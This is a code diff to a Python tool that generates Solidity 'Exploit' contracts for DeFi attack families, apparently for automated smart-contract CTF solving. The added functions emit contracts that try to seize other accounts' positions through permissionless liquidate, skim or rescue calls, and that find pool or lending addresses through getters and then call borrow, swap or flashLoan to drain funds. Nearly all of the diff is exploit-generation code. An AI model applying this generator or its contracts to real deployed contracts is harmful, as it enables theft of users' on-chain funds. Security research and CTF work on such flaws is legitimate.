@@ -35,6 +35,8 @@ def iter_defi_families(src: str, name: str) -> Iterator[Tuple[str, str]]:
     yield from _victim_approve(s, fns, name)
     yield from _seeded_allowance_drain(s, fns, name)
     yield from _cross_chain_bridge(s, fns, name)
+    yield from _liquidate_other(s, fns, name)
+    yield from _imported_protocol(s, fns, name)
 
 
 def _unpermissioned_callback(s, fns, name):
@@ -566,3 +568,116 @@ def _call_bridge(fn):
             pieces.append("0")
     joined = ", ".join(pieces)
     return f"        try IT(t).{fn['name']}{{value: msg.value}}({joined}) {{}} catch {{}}\n"
+
+
+def _liquidate_other(s, fns, name):
+    """Permissionless liquidate/skim/rescue of someone else's position.
+
+    Handsel MiniVault: any account can liquidate(user) when HF < 1.
+    No victim key, no prank, no leftover allowance.
+    """
+    liq = next(
+        (f for f in fns if re.match(
+            r"^(liquidate|seize|skim|rescue|collectProtocol)$", f["name"] or "")),
+        None,
+    )
+    if not liq:
+        return
+    args = []
+    iface_args = []
+    for t, _n in liq["args"]:
+        tl = t.lower()
+        iface_args.append(t)
+        if "address" in tl:
+            args.append("address(uint160(uint256(keccak256(\"user\"))))")
+        elif tl.startswith("uint"):
+            args.append("1 ether")
+        else:
+            args.append("0")
+    yield (
+        f"liquidate-other:{liq['name']}",
+        HEADER
+        + "// Family: permissionless seize of another account (Handsel MiniVault).\n"
+        + "// No victim key. Tries hardcoded CTF addrs then a derived label.\n"
+        + "interface IT {\n"
+        + f"    function {liq['name']}({','.join(iface_args)}) external payable;\n"
+        + "    function victim() external view returns (address);\n"
+        + "    function user() external view returns (address);\n"
+        + "}\n"
+        + "contract Exploit {\n"
+        + "    function run(address t) external payable {\n"
+        + "        address v;\n"
+        + "        try IT(t).victim() returns (address a) { v = a; } catch {}\n"
+        + "        if (v == address(0)) { try IT(t).user() returns (address a) { v = a; } catch {} }\n"
+        + "        if (v == address(0)) v = address(0xA11CE);\n"
+        + _liq_calls(liq, args)
+        + "    }\n    receive() external payable {}\n}\n",
+    )
+
+
+def _liq_calls(liq, default_args):
+    name = liq["name"]
+    has_addr = any("address" in t for t, _ in liq["args"])
+    if not has_addr:
+        return f"        try IT(t).{name}{{value: msg.value}}({', '.join(default_args)}) {{}} catch {{}}\n"
+    return (
+        f"        try IT(t).{name}{{value: msg.value}}("
+        + _liq_subst(liq, "v")
+        + ") {} catch {}\n"
+        f"        try IT(t).{name}{{value: msg.value}}("
+        + _liq_subst(liq, "address(0xA11CE)")
+        + ") {} catch {}\n"
+    )
+
+
+def _liq_subst(liq, addr_expr):
+    parts = []
+    for t, _n in liq["args"]:
+        if "address" in t:
+            parts.append(addr_expr)
+        elif t.startswith("uint"):
+            parts.append("1 ether")
+        else:
+            parts.append("0")
+    return ", ".join(parts)
+
+
+def _imported_protocol(s, fns, name):
+    """Imported Uni/Aave interfaces. Fold via public vars / getters."""
+    if not re.search(r"IUniswap|ISwapRouter|ILendingPool|IPool\b|IAave", s):
+        return
+    drain = next(
+        (f for f in fns if f["external"] and re.search(
+            r"borrow|swap|liquidate|flashLoan|execute", f["name"], re.I)),
+        None,
+    )
+    if not drain:
+        return
+    yield (
+        f"imported-protocol:{drain['name']}",
+        HEADER
+        + "// Family: imported protocol. Discover pool/lending via auto-getters.\n"
+        + "interface IERC20 { function transfer(address,uint256) external returns (bool);\n"
+        + "    function balanceOf(address) external view returns (uint256);\n"
+        + "    function approve(address,uint256) external returns (bool); }\n"
+        + "interface IT {\n"
+        + "    function token() external view returns (address);\n"
+        + "    function pool() external view returns (address);\n"
+        + "    function lending() external view returns (address);\n"
+        + "    function router() external view returns (address);\n"
+        + f"    function {drain['name']}(uint256) external payable;\n"
+        + "}\n"
+        + "contract Exploit {\n"
+        + "    function run(address t) external payable {\n"
+        + "        address p;\n"
+        + "        try IT(t).pool() returns (address a) { p = a; } catch {}\n"
+        + "        if (p == address(0)) { try IT(t).lending() returns (address a) { p = a; } catch {} }\n"
+        + "        if (p == address(0)) { try IT(t).router() returns (address a) { p = a; } catch {} }\n"
+        + "        address tok; try IT(t).token() returns (address k) { tok = k; } catch {}\n"
+        + "        if (tok != address(0) && p != address(0)) {\n"
+        + "            uint256 b = IERC20(tok).balanceOf(address(this));\n"
+        + "            if (b > 0) { IERC20(tok).approve(p, b); IERC20(tok).transfer(p, b); }\n"
+        + "        }\n"
+        + f"        try IT(t).{drain['name']}{{value: msg.value}}(1 ether) {{}} catch {{}}\n"
+        + "    }\n    receive() external payable {}\n}\n",
+    )
